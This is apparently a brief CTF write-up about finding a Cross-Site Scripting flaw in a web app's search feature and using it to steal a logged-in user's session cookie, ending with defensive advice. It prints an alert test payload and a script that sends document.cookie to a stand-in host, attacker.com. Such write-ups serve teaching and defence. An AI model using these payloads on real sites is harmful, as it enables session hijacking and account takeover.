Title: Cross-Site Scripting (XSS) Attack on a Web Application

During a CTF competition, I encountered a web application that included a search feature allowing users to search for content on the website. Given the potential security risks associated with user input, I suspected that the application might be vulnerable to Cross-Site Scripting (XSS), a type of vulnerability that allows attackers to inject malicious code into a web page and manipulate user data.

To test for XSS, I entered a malicious payload containing JavaScript code into the search box, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript code and display an alert box containing the text 'XSS'.

Upon submitting the payload, the application executed the JavaScript code, confirming the presence of an XSS vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the session cookie of a logged-in user.

After researching the application's system and network configuration, I crafted a suitable payload containing JavaScript code that would steal the session cookie of a logged-in user and send it to an attacker-controlled server, such as <script>new Image().src='http://attacker.com/cookie.php?cookie='+document.cookie;</script>. This payload allowed me to obtain the session cookie of a logged-in user, which I could then use to impersonate the user and complete the Web Exploitation challenge.

This CTF writeup highlights the importance of properly securing web applications against Cross-Site Scripting vulnerabilities by implementing proper input validation and output encoding controls, using Content Security Policy (CSP), and validating user input. By exploiting the vulnerability, I was able to steal the session cookie of a logged-in user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS.
